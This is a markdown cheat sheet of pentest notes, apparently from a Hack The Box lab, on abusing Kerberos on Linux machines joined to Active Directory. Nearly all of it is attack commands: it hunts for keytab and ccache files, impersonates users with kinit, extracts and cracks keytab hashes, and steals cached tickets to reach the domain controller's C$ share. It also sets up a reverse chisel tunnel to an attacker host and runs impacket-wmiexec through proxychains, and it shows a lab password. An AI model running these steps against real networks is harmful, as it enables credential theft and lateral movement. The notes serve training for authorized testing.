-----
## Identify Linux and Active Directory Integration
-----

### realm - Check if Linux Machine is Domain joined

```bash
realm list

# Sample output
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

### PS - Check if Linux Machine is Domain Joined
```bash
	ps -ef | grep -i "winbind\|sssd"
```

-------
## Finding Kerberos Tickets in Linux
----

### Finding Keytab Files
- Use Find to search for files with Keytab in the name
```bash
	find / -name *keytab* -ls 2>/dev/null
```
 >*Note: To use keytab files, we must have read and write privileges on the file*

 - Identify Keytab files in cronjobs
 ```bash
 crontab -l
```
-  Look for _**kinit**_, which means Kerberos is in use. _**kinit**_ can be used to import a keytab into our session and act as the user.

## Finding ccach Files
- A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let's look for the environment variables and identify the location of our Kerberos credentials cache:
```bash
env | grep -i krb5
```

### Abuse KeyTab Files
- List KeyTab file information
```bash
	klist -k -t
```

- Impersonate a user with a KeyTab
```bash
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist	
```

- Connect to SMB Share as Carlos
```bash
smbclient //dc01/carlos -k -c ls
```
> **Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable KRB5CCNAME

### KeyTab Extract
- Extract Keytab Hashes with KeyTabExtract
```bash
	python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
- Once obtain the hashes, crack them.
- Log in as Carlos
```bash 
	su - carlos@inlanefreight.htb
```
- Obtain more hashes: Carlos has a cronjob that uses a keytab file named svc_workstation.kt. We can repeat the process, crack the password and log in as svc_workstations.

### Abuse Keytab ccache
- We must obtain root privilege.
- Look for ccache files 
```bash
	ls -la /tmp
```
- Identify Group Membership with the id command
```bash
id julio@inlanefreight.htb
```

- Import the ccache file into our current session
```bash
klist
cp /tmp/krb5cc_<SNIP> .
export KRB5CCNAME=/root/krb5cc_<SNIP>
klist

smbclient //dc01/C$ -k -c ls -no-pass
```

-----------
## Use Linux Attack Tools with Kerberos
-----------
#### Host File Modified
```bash
cat /etc/hosts
172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

#### Proxychains Configuration File
```bash
[ProxyList]
socks5 127.0.0.1 1080
```

#### Download Chisel to ATTACKER HOST
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```

#### Connect to MS01 with xfreerdp
```bash
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

#### Execute chisel from MS01
```cmd-session
C:\htb> c:\tools\chisel.exe client $ATTACKER$:8080 R:socks
```

#### Setting the KRB5CCNAME Environment Variable
```bash
export KRB5CCNAME=/home/htb-student/krb5cc_<SNIP>
```

### Impacket
- Use Impacket with proxychains and Kerberos Authentication
```bash
proxychains impacket-wmiexec ms01 -k
```

